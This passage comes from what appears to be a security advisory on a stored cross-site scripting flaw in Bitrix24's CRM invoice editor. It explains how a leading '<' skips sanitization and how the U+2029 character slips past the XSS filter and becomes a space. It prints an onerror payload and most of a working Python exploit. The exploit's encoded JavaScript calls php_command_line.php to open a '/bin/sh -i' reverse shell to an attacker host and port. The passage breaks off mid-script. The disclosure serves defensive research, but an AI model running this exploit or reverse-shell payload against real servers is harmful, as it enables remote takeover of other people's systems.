</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">AddTags</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;div&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">()));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">AddTags</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;style&#39;</span><span class="p">,</span> <span class="s1">&#39;alt&#39;</span><span class="p">,</span> <span class="s1">&#39;target&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">AddTags</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;p&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">()));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">AddTags</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;span&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;style&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$bSanitizeComments</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$comments</span> <span class="o">=</span> <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">SanitizeHtml</span><span class="p">(</span><span class="nv">$comments</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$bSanitizeUserDescription</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$userDescription</span> <span class="o">=</span> <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">SanitizeHtml</span><span class="p">(</span><span class="nv">$userDescription</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unset</span><span class="p">(</span><span class="nv">$sanitizer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>mb_strpos($userDescription, '&lt;')</code> check (<code>[1]</code>) is supposed to check if the user description contains the <code>&lt;</code> character, which could indicate that this field contains HTML tags and thus requires sanitization. However, if the <code>&lt;</code> character is the first character, <code>mb_strpos($userDescription, '&lt;')</code> would be 0, resulting in <code>$bSanitizeUserDescription</code> being false. Thus, sanitization of this field can be completely bypassed.</p>
<p>The <code>$userDescription</code> field is subsequently saved to the database, along with the rest of the invoice data.</p>
<p>However, the built-in Bitrix XSS sanitizer, applied to the body parameters of every request, complicates exploitation of this vulnerability.</p>
<p>The XSS sanitizer uses several regular expressions (regex) to identify and sanitize potentially dangerous input. One of these aims to target HTML event handlers, which could lead to XSS. The regex used can be found in <code>bitrix/modules/security/lib/filter/auditor/xss.php</code> on line 173, and a simplified version is shown below:</p>
<pre tabindex="0"><code>/(on[a-z]*)([a-z]{3}[\s]*=)/is
</code></pre><p>The regex aims to identify patterns such as <code>onerror=</code> and uses two capturing groups to split the dangerous string into two parts. A space is then added between the two parts, neutralizing the event handler. For example, <code>onerror=</code> would be transformed into <code>oner ror=</code>. Note that the regex allows any amount of whitespace between the event handler name (eg <code>onerror</code>) and the equals sign (<code>=</code>). This is compliant with the HTML specification. On its own, this sanitizer is secure.</p>
<p>When an authorized user navigates to the invoice edit page, the stored invoice is retrieved. The user description field is then passed to the <code>CLightHTMLEditor</code> class as the content to be edited.</p>
<p>The configuration for this editor, including the content, is injected into the JavaScript context after sanitization by the <code>CUtil::PhpToJSObject</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1">// bitrix/modules/fileman/classes/general/light_editor.php line 254
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">top</span><span class="p">.</span><span class="o">&lt;?=</span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">jsObjName</span><span class="o">?&gt;</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="o">&lt;?=</span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">jsObjName</span><span class="o">?&gt;</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">.</span><span class="nx">JCLightHTMLEditor</span><span class="p">(</span><span class="o">&lt;?=</span><span class="nx">CUtil</span><span class="o">::</span><span class="nx">PhpToJSObject</span><span class="p">(</span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">JSConfig</span><span class="p">)</span><span class="o">?&gt;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></div><p>The <code>CUtil::PhpToJSObject</code> function calls the <code>CUtil::JSEscape</code> function (shown below) on the value of each key-value pair in the <code>$this-&gt;JSConfig</code> array.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/tools.php lines 4349 to 4355
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">JSEscape</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$aSearch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xe2\x80\xa9</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\xe2\x80\xa8</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;*/&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$aReplace</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;\\&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">,</span> <span class="s2">&#34;*</span><span class="se">\\</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;</span><span class="se">\\</span><span class="s2">/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$val</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$aSearch</span><span class="p">,</span> <span class="nv">$aReplace</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function performs a simple string replacement on the input string <code>$s</code> to ensure that it does not contain any characters that may break out of a JavaScript string, such as <code>&quot;</code>, <code>'</code> or <code>\</code>.</p>
<p>Notably, this function replaces the byte string <code>\xe2\x80\xa9</code> (<a href="https://www.compart.com/en/unicode/U+2029">U+2029 Unicode Paragraph Separator</a>) with a regular space (<a href="https://www.compart.com/en/unicode/U+0020">U+0020 Space</a>).</p>
<p>This is a significant transformation as the Bitrix XSS sanitizer does not regard the byte string <code>\xe2\x80\xa9</code> as whitespace. Therefore, the string <code>onerror\xe2\x80\xa9=</code> would not be sanitized. However, <code>CUtil::JSEscape</code> would transform the string into <code>onerror =</code>, which is a valid HTML <code>onerror</code> event handler.</p>
<p>After sanitization and transformation by <code>CUtil::JSEscape</code>, the constructor of the JavaScript class <code>JCLightHTMLEditor</code> injects the content to be edited into HTML:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/fileman/light_editor/le_core.js lines 616 to 618
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">pEditorDocument</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">pEditorDocument</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&#39;</span> <span class="o">+</span> <span class="nx">sContent</span> <span class="o">+</span> <span class="s1">&#39;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">pEditorDocument</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</span></span></code></pre></div><p>Therefore, a malicious attacker may create an invoice with user description <code>&lt;img src=x onerror\xe2\x80\xa9=alert(document.domain)&gt;</code>. As <code>&lt;</code> is the first character in the string, sanitization in <code>bitrix/components/bitrix/crm.invoice.edit/component.php</code> is bypassed. Additionally, as <code>onerror\xe2\x80\xa9=</code> does not match the regex for an event handler, the built-in XSS sanitizer does not sanitize this string. Finally <code>CUtil::JSEscape</code> replaces <code>\xe2\x80\xa9</code> with <code> </code>, resulting in <code>&lt;img src=x onerror =alert(document.domain)&gt;</code>. This string is then injected into HTML, resulting in XSS.</p>
<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that edits an existing invoice to inject malicious HTML in the user description field.</p>
<p>A sample exploit script is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Bitrix24 Invoice Edit Page XSS RCE (CVE-2023-XXXXX)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Via: https://TARGET_HOST/crm/invoice/edit/XXXX</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">typing</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SITE_ID</span> <span class="o">=</span> <span class="s2">&#34;s1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">USERNAME</span> <span class="o">=</span> <span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;abcdef&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">TARGET_INVOICE_ID</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LPORT</span> <span class="o">=</span> <span class="mi">9001</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.86.43&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PROXY</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nested_to_urlencoded</span><span class="p">(</span><span class="n">val</span><span class="p">:</span> <span class="n">typing</span><span class="o">.</span><span class="n">Any</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">val</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="p">(</span><span class="n">k</span> <span class="k">if</span> <span class="n">prefix</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="k">else</span> <span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">prefix</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dict_to_str</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&amp;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/tools/public_session.php&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;OK&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Using cached credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Cached credentials are invalid&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/?login=yes&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;AUTH_FORM&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;AUTH&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;backurl&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_LOGIN&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_PASSWORD&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;BITRIX_SM_LOGIN&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Invalid credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;bitrix_sessid&#39;:&#39;([a-f0-9]</span><span class="si">{32}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Logged in as </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">sessid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_invoice</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    fetch(&#34;/bitrix/admin/php_command_line.php?lang=en&amp;&#34;+window.parent.document.body.innerHTML.match(/sessid=[a-f0-9]</span><span class="si">{32}</span><span class="s2">/)[0],{
</span></span></span><span class="line"><span class="cl"><span class="s2">        method:&#34;POST&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">        headers:{
</span></span></span><span class="line"><span class="cl"><span class="s2">          &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
</span></span></span><span class="line"><span class="cl"><span class="s2">        },    
</span></span></span><span class="line"><span class="cl"><span class="s2">        body: new URLSearchParams({
</span></span></span><span class="line"><span class="cl"><span class="s2">            query: `$sock=fsockopen(&#34;LHOST&#34;,LPORT);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);`,
</span></span></span><span class="line"><span class="cl"><span class="s2">            ajax: &#34;y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">            result_as_text:&#34;N&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        })
</span></span></span><span class="line"><span class="cl"><span class="s2">    })
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;LHOST&#34;</span><span class="p">,</span> <span class="n">LHOST</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;LPORT&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;/bitrix/urlrewrite.php?SEF_APPLICATION_CUR_PAGE_URL=%2Fcrm%2Finvoice%2Fedit%2F</span><span class="si">{</span><span class="n">TARGET_INVOICE_ID</span><span class="si">}</span><span class="s2">%2F&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;sessid&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;CRM_INVOICE_EDIT_V12_active_tab&#34;</span><span class="p">:</span> <span class="s2">&#34;tab_1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ACCOUNT_NUMBER&#34;</span><span class="p">:</span> <span class="n">TARGET_INVOICE_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ORDER_TOPIC&#34;</span><span class="p">:</span> <span class="s2">&#34;sss&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;STATUS_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PAY_VOUCHER_DATE&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PAY_VOUCHER_NUM&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;REASON_MARKED_SUCCESS&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;DATE_MARKED&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;REASON_MARKED&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PRIMARY_ENTITY_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;COMPANY&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PRIMARY_ENTITY_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
